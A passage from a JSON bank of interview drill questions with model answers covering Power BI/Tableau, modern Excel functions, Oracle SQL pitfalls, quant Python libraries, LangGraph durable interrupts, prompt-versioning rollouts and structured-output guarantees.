+      "module": "T18-bi-tooling",
+      "q": "Answer 'Power BI or Tableau?' as a senior candidate would.",
+      "a": "Estate decides: Microsoft/Fabric gravity, governed enterprise reporting, bundling -> Power BI near-default; viz-craft culture, analyst exploration, Salesforce adjacency -> Tableau. Neither easier \u2014 DAX filter-context is the deeper modeling concept, Tableau viz-craft the deeper presentation one. Tool religion reads as never having operated in an estate.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-excel-analyst-d1",
+      "module": "T18-excel-analyst",
+      "q": "Your colleague writes =VLOOKUP(A2, Sheet2!A:D, 3, FALSE) and someone inserts a column in Sheet2. What happens, and what's the one-formula modern fix?",
+      "a": "VLOOKUP returns data from the WRONG column silently -- col_index 3 is now a different field. Fix: =XLOOKUP(A2, Sheet2!A:A, Sheet2!C:C) -- lookup and return arrays are independent, so inserts cannot break the mapping. Bonus: multi-column return XLOOKUP(A2, names, B2:D6) spills all three.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T18-excel-analyst-d2",
+      "module": "T18-excel-analyst",
+      "q": "A report shows =UNIQUE(Dept) with #SPILL! that worked yesterday. Diagnose and fix.",
+      "a": "Something now occupies a cell inside the spill's claimed range (an inserted row/column with content, or a new adjacent value). Spills refuse to overwrite -- by design. Fix: clear the blocker; don't re-type the formula.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-excel-analyst-d3",
+      "module": "T18-excel-analyst",
+      "q": "Write a running total with no dragged formula, and name the general mechanism.",
+      "a": "=SCAN(0, C2:C6, LAMBDA(acc, v, acc + v)) -- SCAN emits one value per input element with an accumulator LAMBDA; the whole column spills from one cell. Generalizes: running max, running concatenation, any accumulating logic by changing the LAMBDA body.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-excel-analyst-d4",
+      "module": "T18-excel-analyst",
+      "q": "Produce a live top-3 salespeople list in one formula chain.",
+      "a": "=TAKE(SORTBY(names, sales, -1), 3): SORTBY sorts names by the (hidden) sales column descending, TAKE slices the first 3. Updates automatically as source changes -- no manual re-sort.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-excel-analyst-d5",
+      "module": "T18-excel-analyst",
+      "q": "Why is =SUM(C2:C500000)+AVERAGE(C2:C500000)+MAX(C2:C500000) a problem, and what's the fix?",
+      "a": "Three full passes over 500k rows -- each sub-expression is a separate scan. Fix: =LET(rng, C2:C500000, SUM(rng)+AVERAGE(rng)+MAX(rng)) binds once; with names for each aggregate it also reads better. LET is a performance primitive, not just style.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-excel-analyst-d6",
+      "module": "T18-excel-analyst",
+      "q": "Define CalcTotal(price, tax) = price * (1 + tax) as a workbook function without VBA.",
+      "a": "=LAMBDA(price, tax, price * (1 + tax)) typed in a cell, then Name Manager -> New -> name 'CalcTotal' -> Refers to: the LAMBDA. Now =CalcTotal(150, 0.08) works anywhere in the workbook like a built-in. LAMBDAs recurse via their own saved name -- Excel is Turing-complete without macros.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-excel-analyst-d7",
+      "module": "T18-excel-analyst",
+      "q": "A 400k-row SUMIFS sheet recalculates on every keystroke and takes seconds. Name the diagnosis order.",
+      "a": "1) Volatile functions: INDIRECT/OFFSET/TODAY/NOW chains force full recalc -- replace with structured refs. 2) Whole-column references vs Table ranges. 3) File format: .xlsx -> .xlsb (binary, smaller/faster). 4) Structural: move the aggregation to Power Query/model. 'Excel is slow, use Python' skips the two cheap fixes.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-excel-analyst-d8",
+      "module": "T18-excel-analyst",
+      "q": "Replace the classic LEFT/FIND/MID email-domain extraction with one modern formula.",
+      "a": "=TEXTAFTER(A2, \"@\") \u2014 one readable function, live-updating, no nested FIND arithmetic. For multi-delimiter splits: TEXTSPLIT. Both are live formulas unlike Text-to-Columns, which must be re-run after source changes.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T18-excel-analyst-d9",
+      "module": "T18-excel-analyst",
+      "q": "Why does =IF(A2>120000,\"Senior\",IF(A2>80000,\"Mid\",IF(A2>50000,\"Junior\",\"Entry\"))) get replaced, and write the replacement.",
+      "a": "Nested IF past 2-3 levels is parenthesis-counting soup. =IFS(A2>120000,\"Senior\", A2>80000,\"Mid\", A2>50000,\"Junior\", TRUE,\"Entry\") reads top-to-bottom; the final TRUE is the else catch-all.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T18-excel-analyst-d10",
+      "module": "T18-excel-analyst",
+      "q": "A teammate on Excel 2016 receives your FILTER/UNIQUE workbook. What do they see, and what question should you have asked first?",
+      "a": "#NAME? errors and @-implicit-intersection mangling: 2016 has no dynamic array engine. First question: 'what builds does the team run?' If 2016, the answer was Power Query + INDEX/MATCH, not spills. Version discipline is a production skill, not trivia.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-excel-analyst-d11",
+      "module": "T18-excel-analyst",
+      "q": "Weekly-refresh cleaning (trim, split, casing) \u2014 why Power Query over formulas for the durable version?",
+      "a": "PQ steps are documented, inspectable in a pane, refreshable, and testable \u2014 the logic lives in named steps, not inside cells. Formula-tier (TRIM/TEXTSPLIT/PROPER) is for the ad-hoc one-off pass. The tier choice IS the answer: one-off vs weekly.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-excel-analyst-d12",
+      "module": "T18-excel-analyst",
+      "q": "Name the three tiers of modern Excel and what each owns \u2014 one sentence each.",
+      "a": "Power Query owns ETL (clean/shape/merge before the grid); the Data Model owns relationships and measures (star schema, DAX); the formula tier owns live ad-hoc analysis and self-updating report blocks. Production failures are boundary violations \u2014 ETL in formulas, modeling in mega-formulas.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-oracle-sql-d1",
+      "module": "T18-oracle-sql",
+      "q": "Write a top-5-salaries query two ways and explain why the naive version fails.",
+      "a": "Naive: SELECT name, salary FROM employees WHERE ROWNUM <= 5 ORDER BY salary DESC \u2014 ROWNUM assigned pre-sort = five arbitrary rows, sorted. Correct legacy: SELECT * FROM (SELECT name, salary FROM employees ORDER BY salary DESC) WHERE ROWNUM <= 5. Modern: ORDER BY salary DESC FETCH FIRST 5 ROWS ONLY.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T18-oracle-sql-d2",
+      "module": "T18-oracle-sql",
+      "q": "Why does WHERE ROWNUM = 2 return zero rows?",
+      "a": "ROWNUM is assigned incrementally as rows satisfy prior predicates \u2014 row 2 can only be numbered after row 1 is returned, so it's never 'considered' at position 2. Only ROWNUM <= n and ROWNUM = 1 are satisfiable.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-oracle-sql-d3",
+      "module": "T18-oracle-sql",
+      "q": "A colleague imports a MySQL dump; queries using WHERE email <> '' return nothing. Why?",
+      "a": "Oracle treats the empty string as NULL: '' IS NULL is TRUE, and comparing NULL with <> matches nothing (NULL comparisons are never true). The data didn't vanish \u2014 the predicate can never succeed. There is no blank-but-not-null VARCHAR2 in Oracle.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-oracle-sql-d4",
+      "module": "T18-oracle-sql",
+      "q": "A descending salary report shows NULL salaries at the top. Explain and fix \u2014 portably.",
+      "a": "Oracle sorts NULLs as higher than any value: DESC puts them first (ASC last). Fix: ORDER BY salary DESC NULLS LAST. Portable cross-DB: ORDER BY (CASE WHEN salary IS NULL THEN 1 ELSE 0 END) DESC, salary DESC.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T18-oracle-sql-d5",
+      "module": "T18-oracle-sql",
+      "q": "MERGE throws ORA-30926. What is it and how do you fix it?",
+      "a": "'Unable to get a stable set of rows' \u2014 multiple staging rows match one target row on the join, so UPDATE is ambiguous. Fix: deduplicate staging (latest-wins via ROW_NUMBER() over the business key) before the MERGE. The error code by symptom is an experience signal.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-oracle-sql-d6",
+      "module": "T18-oracle-sql",
+      "q": "Business demands gapless invoice numbers. Why is a sequence the wrong tool, and what replaces it?",
+      "a": "Sequences are non-transactional by design \u2014 rollback and cache both lose numbers, so gaps are guaranteed; NOCACHE/ORDER kill throughput and still aren't gapless under rollback. Gapless is an accounting requirement: serialized counter table (SELECT ... FOR UPDATE or app-level lock) accepting the serialization cost.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-oracle-sql-d7",
+      "module": "T18-oracle-sql",
+      "q": "Write the org-chart hierarchy as CONNECT BY, then name its modern alternative and the trade.",
+      "a": "SELECT emp_name, LEVEL FROM employees START WITH manager_id IS NULL CONNECT BY PRIOR emp_id = manager_id; \u2014 LEVEL (depth) and SYS_CONNECT_BY_PATH come free; NOCYCLE guards dirty data. Alternative: recursive CTE (11.2+) \u2014 portable, composable, depth manual. New code: CTE; read CONNECT BY fluently for maintenance.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-oracle-sql-d8",
+      "module": "T18-oracle-sql",
+      "q": "WHERE date_col BETWEEN SYSDATE-1 AND SYSDATE misses last night's rows. Why?",
+      "a": "Oracle DATE always carries time-of-day: SYSDATE is 'now with time', so the BETWEEN's start boundary excludes yesterday-evening rows. Fix: TRUNC(SYSDATE)-1 to TRUNC(SYSDATE), or explicit day bounds \u2014 the TRUNC habit is institutional for exactly this.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-oracle-sql-d9",
+      "module": "T18-oracle-sql",
+      "q": "Tokyo and London users run the same report; their 'today' rows differ. Which function is the bug and what's the fix?",
+      "a": "SYSDATE is server-TZ (same for both) \u2014 the report must derive day boundaries from CURRENT_DATE (session-TZ), so each user's 'today' is their local today. Real fix: store UTC instants (TIMESTAMP WITH TIME ZONE) and compute local day boundaries at the edge, never in the predicate.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-oracle-sql-d10",
+      "module": "T18-oracle-sql",
+      "q": "NVL vs COALESCE vs DECODE \u2014 when does each genuinely win?",
+      "a": "COALESCE: default (ANSI, lazy per-argument, heterogeneous types). NVL: legacy fluency only \u2014 eager evaluation costs with expensive arguments. DECODE: rare legitimate niche \u2014 NULL=NULL matching ('did the field change from NULL to NULL' checks), accepting that all branches evaluate.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-oracle-sql-d11",
+      "module": "T18-oracle-sql",
+      "q": "Top 3 per department \u2014 write it, and name the RANK/DENSE_RANK/ROW_NUMBER choice.",
+      "a": "SELECT * FROM (SELECT name, dept, RANK() OVER (PARTITION BY dept ORDER BY salary DESC) rnk FROM employees) WHERE rnk <= 3. RANK: ties share rank, next skips (two firsts -> third gets 3). DENSE_RANK: no skip. ROW_NUMBER: arbitrary unique. 'Top 3' with ties included = RANK; exactly 3 = ROW_NUMBER. 12c+ short-circuits this pattern.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-oracle-sql-d12",
+      "module": "T18-oracle-sql",
+      "q": "Why does SELECT 7*6 FROM employees return many rows, and what is DUAL for?",
+      "a": "SELECT without aggregation returns one result per row of the FROM table \u2014 7*6 evaluated per employee-row. DUAL is the one-row scratch table for expression evaluation (SELECT 7*6 FROM DUAL; SELECT SYSDATE FROM DUAL): Oracle historically required FROM, DUAL's one-row-ness is the entire point.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T24-quant-python-stack-d1",
+      "module": "T24-quant-python-stack",
+      "q": "Sketch the QuantLib object graph that prices a European call \u2014 list every object in order.",
+      "a": "Quote (spot) -> YieldTermStructure (flat or bootstrapped) -> BlackVolTermStructure (flat or BlackVarianceSurface) -> BlackScholesMertonProcess(the three) -> EuropeanOption(PlainVanillaPayoff, EuropeanExercise) -> setPricingEngine(AnalyticEuropeanEngine) -> NPV(), delta(), gamma(), vega(), theta().",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T24-quant-python-stack-d2",
+      "module": "T24-quant-python-stack",
+      "q": "Your QuantLib price differs from the desk's by 0.3%. Where do you look FIRST?",
+      "a": "Day counts (Actual365Fixed vs Thirty360 vs ActualActual), calendars (holiday sets), and curve conventions (compounding, settlement days) \u2014 the conventions are where the money hides; the formula is the one thing certainly right. That's why 'the diff is where the day counts hide' is the interview-safe line.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T24-quant-python-stack-d3",
+      "module": "T24-quant-python-stack",
+      "q": "Write the cvxpy long-only fully-invested min-variance problem from memory.",
+      "a": "w = cp.Variable(n); risk = cp.quad_form(w, Sigma); prob = cp.Problem(cp.Minimize(risk), [cp.sum(w) == 1, w >= 0]); prob.solve(). DCP verifies convexity BEFORE solving \u2014 non-PSD Sigma raises, unlike SLSQP which returns garbage silently.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T24-quant-python-stack-d4",
+      "module": "T24-quant-python-stack",
+      "q": "A colleague's portfolio weights jump wildly between quarterly rebalances. Diagnose and fix.",
+      "a": "Estimation error in mu/S amplified by the optimizer \u2014 max-Sharpe is the worst amplifier. Fix the INPUT: Ledoit-Wolf shrinkage on S, Black-Litterman on mu (market prior + views), or HRP which needs no inversion. Then run the bootstrap-stability check: 500 resamples of mu, watch weights scatter.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-quant-python-stack-d5",
+      "module": "T24-quant-python-stack",
+      "q": "Extract implied vol from a 6M option trading at 4.50 when BS-at-30%-vol gives 4.20. Mechanics?",
+      "a": "brentq on f(v) = BS_price(v) - 4.50, bracketed [0.01, 3] \u2014 monotone in v, so bracketing is safe. Deep ITM/OTM: price-vol curve flattens -> inversion unstable, that's the smile near expiry. Or QuantLib's built-in implied-vol helpers.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T24-quant-python-stack-d6",
+      "module": "T24-quant-python-stack",
+      "q": "Fit GARCH(1,1) on daily returns and interpret alpha=0.09, beta=0.89.",
+      "a": "arch_model(r, vol='GARCH', p=1, q=1, dist='t').fit(). alpha+beta = 0.98 = persistence near IGARCH \u2014 shocks decay very slowly (vol clustering). Output: conditional_volatility path (one sigma/day), forecastable h steps ahead. Rolling std would be a window statistic, not this.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T24-quant-python-stack-d7",
+      "module": "T24-quant-python-stack",
+      "q": "Your barrier-option Monte Carlo takes 40s in pure Python. Fix it in order.",
+      "a": "1) Vectorize the path generation (array shape (n_paths, n_steps)) \u2014 but barrier logic is path-dependent, so... 2) @njit(parallel=True, cache=True, fastmath=True) the path loop -> ~100-500x, ~0.2s. 3) GPU/JAX batch only if homogeneous paths at serious scale. Never Numba before attempting vectorization.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T24-quant-python-stack-d8",
+      "module": "T24-quant-python-stack",
+      "q": "Colleague reran your simulation notebook, got different numbers. What did you do wrong?",
+      "a": "Global legacy RNG (np.random.seed) instead of an explicit Generator(PCG64(seed)) \u2014 global state breaks under parallelism and cell-reordering; possibly also unpinned library versions. Model validation rejects code for exactly this: set the evaluation date, pin the generator, lock the versions.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T24-quant-python-stack-d9",
+      "module": "T24-quant-python-stack",
+      "q": "Greeks for a portfolio of 50 options \u2014 finite differences need 200 MC runs. Better?",
+      "a": "Autodiff: JAX grad through the pricing graph \u2014 one forward+backward pass gives all Greeks (pathwise differentiation), replacing the 4x-paths finite-difference stencil. This is the modern convergence of the library conversation and the derivatives math.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-quant-python-stack-d10",
+      "module": "T24-quant-python-stack",
+      "q": "Your backtest signals don't match the trading platform's chart RSI. Debug order.",
+      "a": "Convention mismatch first: TA-Lib's RSI is WILDER smoothing (alpha=1/n recursive), not SMA-of-changes; then warmup periods, adjusted-vs-raw closes, and field/schema drift if data sources differ. Indicator conventions before strategy logic, every time.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T24-quant-python-stack-d11",
+      "module": "T24-quant-python-stack",
+      "q": "You have no views. What does Black-Litterman reduce to, and why is that the right answer?",
+      "a": "The market prior \u2014 reverse-optimized equilibrium returns from cap weights. BL is a better ESTIMATOR not a better solver; with no views there's nothing to blend, and the prior IS the estimate. Knowing the formula collapses is the understanding.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-quant-python-stack-d12",
+      "module": "T24-quant-python-stack",
+      "q": "Name the tiers: non-negotiable / extremely valuable / powerful-but-situational.",
+      "a": "Non-negotiable: NumPy, SciPy, Statsmodels, QuantLib, cvxpy. Extremely valuable: scikit-learn, Numba, PyTorch/JAX, pyarrow/polars. Powerful-but-situational: arch, PyPortfolioOpt, TA-Lib, yfinance. Bottom line: your desk determines what matters most; the mistake isn't the wrong library \u2014 it's learning libraries instead of the mathematics underneath.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T07-ambient-agents-d1",
+      "module": "T07-ambient-agents",
+      "q": "What is the resume token for a durable interrupt, concretely?",
+      "a": "The pair (thread_id, checkpointer) -- not a process, session, or callback. A different process loads state by thread_id and calls Command(resume=value).",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T07-ambient-agents-d2",
+      "module": "T07-ambient-agents",
+      "q": "What does interrupt() actually resume from on LangGraph?",
+      "a": "The beginning of the node, not the line where interrupt() was called -- checkpointing is node-granular, not statement-granular. Any code before the interrupt runs again.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T07-ambient-agents-d3",
+      "module": "T07-ambient-agents",
+      "q": "Name three things that cannot go into a LangGraph checkpoint.",
+      "a": "Open DB connections/file handles, sockets or locks, and in-memory closures over live objects. State should hold ids, paths, and primitives only.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T07-ambient-agents-d4",
+      "module": "T07-ambient-agents",
+      "q": "An eight-hour-old approval comes back. Why can't you just act on it directly?",
+      "a": "It authorizes an intent based on the world as it was eight hours ago. Re-read the live precondition inside the executing node, right before the side effect, rather than trusting the paused snapshot.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-ambient-agents-d5",
+      "module": "T07-ambient-agents",
+      "q": "A node has a `while True` loop calling interrupt() to re-prompt on invalid input. What breaks on the third resume?",
+      "a": "Exponential replay: each resume replays every prior iteration of the loop, so the third resume replays two full iterations of pre-interrupt code. Fix: a conditional edge back to a node that calls interrupt() exactly once per invocation.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-ambient-agents-d6",
+      "module": "T07-ambient-agents",
+      "q": "Rank the fixes for a mutating side effect near an interrupt(), best first.",
+      "a": "Move it after the interrupt or into its own node > make it naturally idempotent (upsert) > deterministic idempotency key with a long TTL > wrap in @task (still not exactly-once).",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-ambient-agents-d7",
+      "module": "T07-ambient-agents",
+      "q": "Two processes write to one SQLite checkpoint file with WAL mode enabled. Does that fix contention?",
+      "a": "Only reader/writer contention. SQLite still has exactly one writer regardless of journal mode; busy_timeout lets a second writer retry, but under 3+ concurrent writers it will eventually expire anyway.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-ambient-agents-d8",
+      "module": "T07-ambient-agents",
+      "q": "What's the actual signal that tells you to move off SqliteSaver to PostgresSaver?",
+      "a": "More than one process regularly writing checkpoints, or more than one replica -- not a specific error. At that point Postgres is a correctness requirement (real concurrent writers via MVCC), not an upgrade.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-ambient-agents-d9",
+      "module": "T07-ambient-agents",
+      "q": "A webhook redelivers and your tool-call idempotency key (thread_id, checkpoint_id, op) doesn't stop the duplicate run. Why not, and what's the fix?",
+      "a": "Redelivery starts a whole new run with a fresh checkpoint_id, so the derived key differs too. Fix: dedupe on the trigger's own identity (delivery_id) before thread creation, not inside the graph.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-ambient-agents-d10",
+      "module": "T07-ambient-agents",
+      "q": "A cron job runs every 15 minutes but occasionally takes 35. What goes wrong and what's the fix?",
+      "a": "Overlapping runs hit the same downstream resources simultaneously. Fix: lock on the job's identity (not the thread id) before a new fire starts, skipping the fire if a run is already in progress.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-ambient-agents-d11",
+      "module": "T07-ambient-agents",
+      "q": "A hundred cron-triggered agents each stay within their own per-run cost budget, but you get a 429 storm on the hour. Diagnose.",
+      "a": "Per-run budgets say nothing about the shared, org-wide provider rate limit. Independent per-run backoff on 429 synchronizes into a thundering herd. Fix: a shared token-bucket limiter the scheduler checks before dispatch.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T07-ambient-agents-d12",
+      "module": "T07-ambient-agents",
+      "q": "How do you tell a silently-dead ambient run apart from one that's just slow, without watching it live?",
+      "a": "Alert on last_checkpoint_at staleness relative to the task's own expected cadence, not on \"no logs\" -- a completed run also stops producing logs, so that signal can't distinguish the two states.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T07-ambient-agents-d13",
+      "module": "T07-ambient-agents",
+      "q": "Is RunControl.request_drain() a kill switch?",
+      "a": "No. It's the graceful, cooperative, in-process SIGTERM handler for a deploy -- it doesn't cancel a hung tool call and isn't reachable from outside the process. A real kill switch needs a run_status check at every tool-call boundary (soft) plus credential revocation (hard).",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T07-ambient-agents-d14",
+      "module": "T07-ambient-agents",
+      "q": "You need to rename a state key, and there are ambient threads currently interrupted that might not resume for weeks. What do you ship?",
+      "a": "Expand/contract: add the new key, dual-write it alongside the old one from every touching node, deploy, and only remove the old key once every in-flight thread has passed through a dual-write node.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T07-ambient-agents-d15",
+      "module": "T07-ambient-agents",
+      "q": "When would you skip the durable-interrupt machinery entirely?",
+      "a": "When the human is present and the wait is seconds -- an inline confirmation beats a durable interrupt, an approvals table, and an expiry policy. The ambient machinery earns its cost only once the wait genuinely spans processes, hours, or days.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T07-prompt-versioning-d1",
+      "module": "T07-prompt-versioning",
+      "q": "A teammate says 'we keep our prompts in git, that's versioning.' What does git alone NOT give you, and what does the pipeline add?",
+      "a": "Git gives diff, review, blame \u2014 storage. It does not give delivery: no staged rollout (1% -> 10% -> 100% with sticky hash split), no auto-revert without a deploy, no instant promote for non-code owners, and prompt iteration cadence ends up coupled to the deploy train. The pipeline adds: eval gate on every diff (new >= old - epsilon), online guardrails per version, and rollback as a label repoint (<1 min, no build).",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T07-prompt-versioning-d2",
+      "module": "T07-prompt-versioning",
+      "q": "Walk through the promote gate: what must be true before a prompt version goes from staged to a wider rollout?",
+      "a": "Eval gate passed: new_score >= old_score - epsilon, where epsilon is the eval's own measured jitter (run same version twice, typically 1-3 pts). Then guardrails green at the current stage: task completion, schema-validity >= 99%, cost/step <= 1.15x baseline (excluding post-flip cache warm-up), p95 <= 1.25x. Pre-registered promotion criteria (n per arm, soak time) met \u2014 never 'looks fine, advance it'.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T07-prompt-versioning-d3",
+      "module": "T07-prompt-versioning",
+      "q": "Why do PATCH bumps (typos) still need the eval gate?",
+      "a": "Intent is not a guarantee. A formatting change can alter tokenization or attention enough to shift behavior; reordering few-shots is a MINOR bump with real consequences because position in context changes attention; PATCH-level 'cleanups' have regressed double digits. The gate is cheap relative to one silent regression.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T07-prompt-versioning-d4",
+      "module": "T07-prompt-versioning",
+      "q": "Your cost guardrail trips 30 minutes into a 100% rollout and auto-reverts a change you believe is good. What happened and how do you fix the guardrail?",
+      "a": "Post-flip cache warm-up: the new prompt prefix invalidates the old cache, every request pays the 1.25x write on input while the prefix warms, so cost/request spikes briefly. Fix: exclude the first window after any flip from the cost guardrail, or baseline cost in token-equivalents (cache_creation + 0.1x cache_read + uncached) rather than dollars.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-prompt-versioning-d5",
+      "module": "T07-prompt-versioning",
+      "q": "Canary: 500 requests, 79% completion. Control: 4,500 requests, 83%. Compute the z-score, state your decision, and name the n you'd need to confirm a 4-point drop.",
+      "a": "SE_canary = sqrt(0.79*0.21/500) ~= 1.8%; SE_control = sqrt(0.83*0.17/4500) ~= 0.56%; SE_diff ~= 1.9%; z = 4/1.9 ~= 2.1 \u2014 borderline: revert if policy is 2-sigma hard, else hold one more window. To confirm a 4-point drop at 95%/80% power you need roughly 1,600-1,700 per arm. Note the absolute floor (0.70) has not tripped; this is a relative-tier decision, and it requires n >= 100 per arm minimum.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-prompt-versioning-d6",
+      "module": "T07-prompt-versioning",
+      "q": "Cache hit rate fell from 90% to near zero overnight. No deploy, no model change. Diagnose.",
+      "a": "Most likely: someone interpolated a per-request value (current date, user name, tenant id) inside the cached system prefix. The prefix is then unique per request, never matches, and that segment is charged at ~10x the cached rate forever. Both vendors' docs call this the canonical mistake. Fix: static content in the cached prefix, variables after the breakpoint; make cache-hit rate itself a guardrail metric so this pages instead of silently costing.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-prompt-versioning-d7",
+      "module": "T07-prompt-versioning",
+      "q": "Design the hotfix lane for a PM who needs to ship a wording fix at 18:00 Friday with no deploy.",
+      "a": "Exists by design or it exists by shadow (someone edits prod directly, once, and you learn from the outage). The lane: 1) still gated \u2014 2-minute fast-eval on a reduced golden slice runs before promote, no exceptions; 2) capped \u2014 promotes to 5% traffic, not 100%; 3) timed \u2014 30m-2h auto-expiry back to the previous version unless a human confirms; 4) loud \u2014 pages the prompt owner. Saturday cleanup: the hotfix goes through the full gate before 100%.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-prompt-versioning-d8",
+      "module": "T07-prompt-versioning",
+      "q": "Why is 12 hand-written golden-set items 'gate theater,' and what does a real eval set look like?",
+      "a": "12 items catches only catastrophic breakage (schema violations, hard refusals, empty outputs); a 5-point regression on ambiguous cases passes cleanly. Real set: 50-100+ items mined from actual traffic (the Pareto of what users do), adversarial cases (PII, injection, off-topic), verifiers (exact match where possible, judge where not, spot-checked vs human labels), a held-out slice authors never see, and continuous refresh from production. Measure the eval's own jitter by double-running; that spread sets epsilon.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-prompt-versioning-d9",
+      "module": "T07-prompt-versioning",
+      "q": "One logical prompt runs on Claude, GPT, and an internal model. How do you version it, and what's the failure mode you're preventing?",
+      "a": "Version the behavioral spec once (inputs, outputs, guardrails, contract) and attach per-model renderings as variants \u2014 router@v12[claude], router@v12[gpt] \u2014 each rendered from the same spec, each evaled against the same golden set. The failure mode: independent per-model prompt repos that drift independently with no shared definition of 'regression.' 'One universal prompt' is the lowest common denominator, mediocre on every model, and still unstable as vendors change behavior. Honest cost: multi-model triples the eval surface.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T07-prompt-versioning-d10",
+      "module": "T07-prompt-versioning",
+      "q": "You're rolling out a prompt registry to 5 teams with 20 prompts. Nobody wants it. What's your adoption sequence, and what's the failure mode of it?",
+      "a": "1) Make the loader the easiest path \u2014 few-line SDK call with client-side cache so the latency objection dies. 2) Seed it by importing existing prompts WITH history (starts full, not empty). 3) Require it first only for shared prompts, where drift is the demonstrable live failure (two services answering differently is your slide). 4) Show debugging value \u2014 trace -> prompt version -> per-version metrics. 5) Only then enforce the gate on direct prod edits. Exempt the two-person team with a stable prompt explicitly. Failure mode: step 1 without step 4 \u2014 a pile of unversioned copies in a nicer UI; if nobody queries 'which version was live when this happened' in month two, the rollout is decorative.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T07-structured-output-d1",
+      "module": "T07-structured-output",
+      "q": "A teammate says 'just use JSON mode.' What exactly does JSON mode guarantee and not guarantee?",
+      "a": "It guarantees syntactically valid JSON \u2014 that's all. No required keys, no value types, no enums, no key-set restriction: the model can emit {} or a misspelled key in perfect JSON. Prompting-only schema following was measured under 40% on gpt-4-0613. The fix for shape is Structured Outputs/constrained decoding or a repair loop, not JSON mode.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T07-structured-output-d2",
+      "module": "T07-structured-output",
+      "q": "You get a 200 response from a strict structured-output call but the text violates your schema. What are the two documented causes and how do you detect each?",
+      "a": "(1) Safety refusal \u2014 the refusal path bypasses the grammar by design: OpenAI returns a refusal field, Anthropic stop_reason 'refusal'; you were billed. (2) Truncation \u2014 max_tokens cut mid-generation: finish_reason 'length' (OpenAI) / stop_reason 'max_tokens' (Anthropic), output structurally incomplete. Detection: read the finish/stop reason fields BEFORE parsing; never discover truncation via a JSON parse error, because the fix (token budget, continuation) differs from a model misbehavior fix.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T07-structured-output-d3",
+      "module": "T07-structured-output",
+      "q": "Your extraction schema uses minimum: 0 and maxLength: 40 on fields. On Anthropic the request fails; via the Python SDK on another provider it succeeds but the constraints are never enforced. Explain both behaviors.",
+      "a": "Anthropic documents numeric ranges (minimum/maximum/multipleOf) and string lengths (minLength/maxLength) as outside the supported subset \u2014 unsupported keywords produce a 400 at request time, the honest failure. The SDK path silently transforms the schema: it strips unsupported keywords and appends them to field descriptions, so the constraint becomes a suggestion the model may ignore. Both mean the grammar cannot enforce those constraints \u2014 you need code validation plus the repair loop.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-structured-output-d4",
+      "module": "T07-structured-output",
+      "q": "Derive why an FSM-based constrained decoding engine cannot handle a recursive schema, and name OpenAI's canonical example.",
+      "a": "A recursive schema like a UI component tree (children: {items: {$ref: '#'}}) nests to arbitrary depth; matching brackets at arbitrary depth requires counting, which needs a stack \u2014 a pushdown automaton. An FSM has finitely many states and no memory, so it cannot distinguish nesting levels and either rejects the schema or caps depth. This is why OpenAI compiled JSON Schema to a CFG, not an FSM/regex. Note: Anthropic's subset does not support recursive schemas at all, so recursion is a per-provider capability question.",
+      "difficulty": "mid"
+    },
+    {
